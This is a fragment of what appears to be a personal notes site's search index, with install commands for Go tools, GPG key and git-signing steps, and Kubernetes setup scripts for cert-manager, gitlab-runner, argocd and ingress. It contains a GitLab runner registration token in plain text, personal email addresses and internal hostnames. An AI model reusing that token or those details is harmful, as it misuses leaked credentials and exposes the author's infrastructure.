id=\"dasel\"\u003edasel\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003eSelect, put and delete data from JSON, TOML, YAML, XML and CSV files with a single tool. Supports conversion between formats and can be used as a Go package.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ebrew install dasel\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ego install github.com/tomwright/dasel/v2/cmd/dasel@master\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"hey\"\u003ehey\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003eHTTP load generator, ApacheBench (ab) replacement, formerly known as rakyll/boom\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ebrew install hey\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"slides\"\u003eslides\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003eTerminal based presentation tool\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ebrew install slides\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ego install github.com/maaslalani/slides@latest\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"gokart\"\u003egokart\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003eA static analysis tool for securing Go code\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ego install github.com/praetorian-inc/gokart@latest\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"structslop\"\u003estructslop\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003estructslop is a static analyzer for Go that recommends struct field rearrangements to provide for maximum space/allocation efficiency.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ego install -v github.com/orijtech/structslop/cmd/structslop@v0.0.8\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ego get github.com/orijtech/structslop/cmd/structslop\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"dive\"\u003edive\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003eA tool for exploring each layer in a docker image\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ebrew install dive\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ego get github.com/wagoodman/dive\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"sttr\"\u003esttr\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003ecross-platform, cli app to perform various operations on string\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ego install github.com/abhimanyu003/sttr@latest\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"gentool\"\u003egentool\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003eGen Tool is a single binary without dependencies can be used to generate structs from database\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ego install gorm.io/gen/tools/gentool@latest\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"wire\"\u003ewire\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ego install github.com/google/wire/cmd/wire@latest\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"ko\"\u003eko\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003eBuild and deploy Go applications\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ego install github.com/google/ko@latest\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"talisman\"\u003eTalisman\u003c/h5\u003e\n\u003cblockquote\u003e\n\u003cp\u003eA tool to detect and prevent secrets from getting checked in\u003c/p\u003e","tags":null,"title":"Go Tools"},{"categories":null,"contents":" Install brew install gnupg Generate gpg --full-generate-key gpg --list-secret-keys Generate Problem $ gpg --full-generate-key gpg: Sorry, no terminal at all requested - can\u0026#39;t get input Comment out no-tty in ~/.gnupg/gpg.conf\nAdd to git gpg --armor --export 51ADF7101CA64B2508AE29EEC279555531A1DD62 Set .gitconfig git config user.email zeyanlin@outlook.com git config user.name Ricky git config user.signingkey 51ADF7101CA64B2508AE29EEC279555531A1DD62 git config commit.gpgsign true Delete key gpg --delete-secret-keys 51ADF7101CA64B2508AE29EEC279555531A1DD62 Backup key # https://www.jwillikers.com/backup-and-restore-a-gpg-key gpg --list-secret-keys --keyid-format LONG # Export key as a file, replace email-address and Enter the private key’s passphrase gpg -o private.gpg --export-options backup --export-secret-keys rickylin@cloud-miner.net # Restore key and enter the private key’s passphrase gpg --import-options restore --import private.gpg If GPG not work echo \u0026#39;export GPG_TTY=$(tty)\u0026#39; \u0026gt;\u0026gt; ~/.zshrc gpgconf –kill gpg-agent exec $SHELL Encrypt file # Encrypt file gpg --symmetric --cipher-algo aes256 archive_file.tar # Decrypt file gpg --output archive_file.tar --decrypt archive_file.tar.gpg ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/notes/bash/gpg/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eInstall\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ebrew install gnupg\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eGenerate\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egpg --full-generate-key\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egpg --list-secret-keys\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eGenerate Problem\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ gpg --full-generate-key\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egpg: Sorry, no terminal at all requested - can\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u0026#39;\u003c/span\u003et get input\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eComment out no-tty in \u003ccode\u003e~/.gnupg/gpg.conf\u003c/code\u003e\u003c/p\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eAdd to git\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egpg --armor --export 51ADF7101CA64B2508AE29EEC279555531A1DD62\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eSet .gitconfig\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egit config user.email zeyanlin@outlook.com\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egit config user.name Ricky\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egit config user.signingkey 51ADF7101CA64B2508AE29EEC279555531A1DD62\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egit config commit.gpgsign true\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eDelete key\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egpg --delete-secret-keys 51ADF7101CA64B2508AE29EEC279555531A1DD62\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eBackup key\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# https://www.jwillikers.com/backup-and-restore-a-gpg-key\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egpg --list-secret-keys --keyid-format LONG\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Export key as a file, replace email-address and Enter the private key’s passphrase\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egpg -o private.gpg --export-options backup --export-secret-keys rickylin@cloud-miner.net\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Restore key and enter the private key’s passphrase\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egpg --import-options restore --import private.gpg\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eIf GPG not work\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;export GPG_TTY=$(tty)\u0026#39;\u003c/span\u003e \u0026gt;\u0026gt; ~/.zshrc\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egpgconf –kill gpg-agent\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eexec $SHELL\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eEncrypt file\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Encrypt file\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egpg --symmetric --cipher-algo aes256 archive_file.tar\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Decrypt file\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egpg --output archive_file.tar --decrypt archive_file.tar.gpg\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"GPG Command"},{"categories":null,"contents":" cert-manager cert-manager Route53 IAM Role Cert Manager Resource Cert Generate Resource Cert Ingress Resource # install the cert-manager CustomResourceDefinition resources kubectl apply -f https://github.com/cert-manager/cert-manager/releases/download/v1.13.1/cert-manager.crds.yaml # Add the Jetstack Helm repository helm repo add jetstack https://charts.jetstack.io helm repo update # install the cert-manager helm chart helm install \\ cert-manager jetstack/cert-manager \\ --namespace cert-manager \\ --create-namespace \\ --version v1.13.1 \\ --set installCRDs=true --set prometheus.enabled=false \\ --set webhook.timeoutSeconds=4 # uninstalling helm delete my-release kubectl delete -f https://github.com/cert-manager/cert-manager/releases/download/v1.13.1/cert-manager.crds.yaml # create clusterissuer kubectl apply -f cert-manager-resource.yaml # generate certificate kubectl apply -f cert-generate-resource.yaml # create ingress controller kubectl apply -f https://raw.githubusercontent.com/kubernetes/ingress-nginx/controller-v1.8.2/deploy/static/provider/cloud/deploy.yaml # create ingress kubectl apply -f cert-ingress-resource.yaml helm # install plugin helm plugin install https://github.com/chartmuseum/helm-push.git # add repo ## helm repo add --username gitlab-ci-token --password ${CI_JOB_TOKEN} ${CI_PROJECT_NAME} ${CI_API_V4_URL}/projects/${CI_PROJECT_ID}/packages/helm/stable helm repo add go2helm https://gitlab.go2cloudten.com/api/v4/projects/29/packages/helm/stable --username ricky # push chart ## https://docs.gitlab.com/ee/user/packages/helm_repository/ helm cm-push ./proxy-0.1.0.tgz go2helm kompose kompose --file docker-compose.yml convert gitlab-runner link\ngitlab-admin-service-account.yaml # CA Certificate kubectl get secret $(kubectl get secret | grep default | awk \u0026#39;{print $1}\u0026#39;) -o jsonpath=\u0026#34;{[\u0026#39;data\u0026#39;][\u0026#39;ca\\.crt\u0026#39;]}\u0026#34; | base64 --decode # Service Token kubectl apply -f gitlab-admin-service-account.yaml kubectl -n kube-system describe secret $(kubectl -n kube-system get secret | grep gitlab | awk \u0026#39;{print $1}\u0026#39;) # https://gitlab.com/gitlab-org/charts/gitlab-runner/blob/master/values.yaml echo | openssl s_client -CAfile ca.crt -connect gitlab.knowhow.it:443 \u0026gt; /tmp/certs/server.pem # Install gitlab-runner from gitlab helm repo add gitlab https://charts.gitlab.io kubectl create namespace gitlab kubectl --namespace gitlab create secret generic gitlab-certs --from-file=gitlab.knowhow.it.crt=/tmp/certs/server.pem --from-file=registry.knowhow.it.crt=/tmp/certs/server.pem helm install --namespace gitlab k8srunner --set gitlabUrl=https://gitlab.knowhow.it,runnerRegistrationToken=VmyYjzmU_FjqyMJNJxJK,certsSecretName=gitlab-certs,rbac.create=true,runners.privileged=true,runners.tags=k8s,runners.image=alpine:3.12,runners.locked=false gitlab/gitlab-runner k3d k3d.yaml # create cluster k3d cluster create --config k3d.yaml # delete cluster k3d cluster delete local # import image k3d image import superapp -c local kind kind.yaml # create cluster kind create cluster --config kind.yaml # delete cluster kind delete cluster -n local # import image kind load docker-image superapp -n local rancher #!/usr/bin/env bash docker run \\ -d \\ --restart=always \\ --name rancher \\ --network=host \\ -v /etc/ssl/server.crt:/etc/rancher/ssl/cert.pem \\ -v /etc/ssl/server.key:/etc/rancher/ssl/key.pem \\ -v /etc/ssl/ca.crt:/etc/rancher/ssl/cacerts.pem \\ --privileged \\ rancher/rancher:latest skaffold #!/usr/bin/env bash # https://github.com/GoogleContainerTools/skaffold/examples/getting-started curl -Lo skaffold https://storage.googleapis.com/skaffold/releases/latest/skaffold-linux-amd64 \u0026amp;\u0026amp; \\ sudo install skaffold /usr/local/bin/ k8s in k8s #!/usr/bin/env bash ## Install kubernetes-in-kubernetes helm repo add kvaps https://kvaps.github.io/charts helm install kik kvaps/kubernetes --version 0.13.4 \\ --namespace kik \\ --create-namespace \\ --set persistence.storageClassName=local-path argocd #!/usr/bin/env bash nameSpace=\u0026#39;argocd\u0026#39; port=8443 ## helm ## https://github.com/argoproj/argo-helm/tree/master/charts/argo-cd helm repo add argo https://argoproj.github.io/argo-helm helm repo update helm install argocd argo/argo-cd \\ --namespace ${nameSpace} --create-namespace \\ --set server.service.type=NodePort \\ --set server.service.nodePortHttps=${port} ## kubectl # kubectl create namespace ${nameSpace} # kubectl apply -n ${nameSpace} -f https://raw.githubusercontent.com/argoproj/argo-cd/stable/manifests/install.yaml # sleep 60 # kubectl apply -f - \u0026lt;\u0026lt;SVC # apiVersion: v1 # kind: Service # metadata: # labels: # app.kubernetes.io/component: server # app.kubernetes.io/name: argocd-server # app.kubernetes.io/part-of: argocd # name: argocd-server # namespace: ${nameSpace} # spec: # type: NodePort # selector: # app.kubernetes.io/name: argocd-server # ports: # - name: https # nodePort: ${port} # port: 443 # targetPort: 8080 # SVC if ! which argocd 2\u0026gt;\u0026amp;1 \u0026gt;/dev/null; then wget https://github.com/argoproj/argo-cd/releases/download/v2.1.7/argocd-linux-amd64 chmod 755 argocd-linux-amd64 mv argocd-linux-amd64 /usr/local/bin/argocd fi sleep 120 account=\u0026#39;admin\u0026#39; password=$(kubectl -n ${nameSpace} get secret argocd-initial-admin-secret -o jsonpath=\u0026#34;{.data.password}\u0026#34; | base64 -d) echo ${account} echo ${password} ## CLI # argocd login https://192.168.185.95:6443 # argocd app create guestbook --repo https://github.com/argoproj/argocd-example-apps.git --path guestbook --dest-server https://kubernetes.default.svc --dest-namespace default delete() { kubectl delete clusterrole argocd-application-controller ; kubectl delete clusterrole argocd-server kubectl delete clusterrolebindings argocd-application-controller ; kubectl delete clusterrolebindings argocd-server } cert manager #!/usr/bin/env bash ## Install cert-manager ## https://cert-manager.io/docs/installation/ helm repo add jetstack https://charts.jetstack.io helm install \\ cert-manager jetstack/cert-manager \\ --namespace cert-manager \\ --create-namespace \\ --version v1.7.2 \\ --set installCRDs=true \\ --set prometheus.enabled=false \\ --set webhook.timeoutSeconds=4 cilium #!/usr/bin/env bash set -eux use_cli() { curl -L --remote-name-all https://github.com/cilium/cilium-cli/releases/latest/download/cilium-darwin-amd64.tar.gz{,.sha256sum} shasum -a 256 -c cilium-darwin-amd64.tar.gz.sha256sum sudo tar xzvfC cilium-darwin-amd64.tar.gz /usr/local/bin rm cilium-darwin-amd64.tar.gz{,.sha256sum} cilium install } helm install cilium cilium/cilium --version 1.11.0 \\ --namespace kube-system ingress #!/usr/bin/env bash ingressClass=\u0026#39;nginx\u0026#39; ingressFile=\u0026#39;/tmp/ing.yaml\u0026#39; ingressIP=\u0026#39;192.168.185.109\u0026#39; ingressName=\u0026#39;proxy\u0026#39; ingressSuffix=\u0026#39;ingress-nginx\u0026#39; nameSpace=\u0026#39;ingress\u0026#39; nginxRepo=\u0026#39;ingress-nginx\u0026#39; replica=0 if [[ \u0026#34;$1\u0026#34; == \u0026#34;delete\u0026#34; ]]; then # Delete kubectl delete namespace ${nameSpace} kubectl delete IngressClass ${ingressClass} # kubectl delete ValidatingWebhookConfiguration ${ingressName}-ingress-nginx-admission exit $? fi if ! $(helm repo list | grep ${nginxRepo} \u0026gt;/dev/null); then echo \u0026#34;Install ${nginxRepo}\u0026#34; helm repo add ${nginxRepo} https://kubernetes.github.io/ingress-nginx helm repo update fi # --set controller.autoscaling.enabled=true \\ # --set controller.autoscaling.maxReplicas=9 \\ # --set controller.metrics.enabled=true \\ helm install ${ingressName} ${nginxRepo}/${ingressSuffix} \\ --namespace ${nameSpace} --create-namespace \\ --set controller.ingressClass=${ingressClass} \\ --set controller.replicaCount=${replica} \\ --set controller.service.externalTrafficPolicy=Local # --set controller.publishService.enabled=true # --set controller.defaultBackend.port=443 \\ # --set controller.hostNetwork=true \\ # --set controller.kind=DaemonSet \\ # --set controller.daemonset.useHostPorts=true \\ # --set controller.service.loadBalancerIP=${ingressIP} clusertIP=$(kubectl -n ingress get service | awk \u0026#39;NR==2{print $3}\u0026#39;) cat \u0026lt;\u0026lt;-EOF \u0026gt;${ingressFile} # apiVersion: v1 # kind: Service # metadata: # name: ${ingressName}-${ingressSuffix} # spec: # clusterIP: ${clusertIP} # externalIPs: # - ${ingressIP} # externalTrafficPolicy: Local # selector: # app: proxy-nginx-ingress # ports: # - name: https # port: 443 # targetPort: 443 # type: LoadBalancer # status: # loadBalancer: # ingress: # - ip: ${ingressIP} # \\-\\-\\- # kind: Endpoints # apiVersion: v1 # metadata: # name: ${ingressName}-${ingressSuffix} # subsets: # - addresses: # - ip: 54.238.209.164 # ports: # - name: https # port: 443 # - name: ssh # port: 22 \\-\\-\\- apiVersion: networking.k8s.io/v1 kind: Ingress metadata: name: ingress annotations: kubernetes.io/ingress.class: ${ingressClass} nginx.ingress.kubernetes.io/upstream-vhost: own.go2cloudten.com nginx.ingress.kubernetes.io/backend-protocol: \u0026#34;HTTPS\u0026#34; nginx.ingress.kubernetes.io/default-backend: ${ingressName}-${ingressSuffix}-controller nginx.ingress.kubernetes.io/http2-push-preload: \u0026#34;true\u0026#34; nginx.ingress.kubernetes.io/service-upstream: \u0026#34;true\u0026#34; # nginx.ingress.kubernetes.io/rewrite-target: / spec: # defaultBackend: # service: # name: ${ingressName}-${ingressSuffix} # port: # number: 443 rules: - host: gitlab.go2cloudten.com http: paths: - path: /* pathType: Prefix backend: service: name: ${ingressName}-${ingressSuffix} port: number: 443 # - path: /* # pathType: Prefix # backend: # service: # name: ${ingressName}-${ingressSuffix} # port: # name: ssh EOF # kubectl -n ingress apply -f ${ingressFile} krew #!/usr/bin/env bash set -x cd \u0026#34;$(mktemp -d)\u0026#34; \u0026amp;\u0026amp; OS=\u0026#34;$(uname | tr \u0026#39;[:upper:]\u0026#39; \u0026#39;[:lower:]\u0026#39;)\u0026#34; \u0026amp;\u0026amp; ARCH=\u0026#34;$(uname -m | sed -e \u0026#39;s/x86_64/amd64/\u0026#39; -e \u0026#39;s/\\(arm\\)\\(64\\)\\?.*/\\1\\2/\u0026#39; -e \u0026#39;s/aarch64$/arm64/\u0026#39;)\u0026#34; \u0026amp;\u0026amp; KREW=\u0026#34;krew-${OS}_${ARCH}\u0026#34; \u0026amp;\u0026amp; curl -fsSLO \u0026#34;https://github.com/kubernetes-sigs/krew/releases/latest/download/${KREW}.tar.gz\u0026#34; \u0026amp;\u0026amp; tar zxvf \u0026#34;${KREW}.tar.gz\u0026#34; \u0026amp;\u0026amp; ./\u0026#34;${KREW}\u0026#34; install krew export PATH=\u0026#34;${KREW_ROOT:-$HOME/.krew}/bin:$PATH\u0026#34; kubectl krew install change-ns kubectl change-ns nginx prometheus #!/usr/bin/env bash nameSpace=\u0026#39;monitoring\u0026#39; prometheusPort=9090 grafanaPort=3000 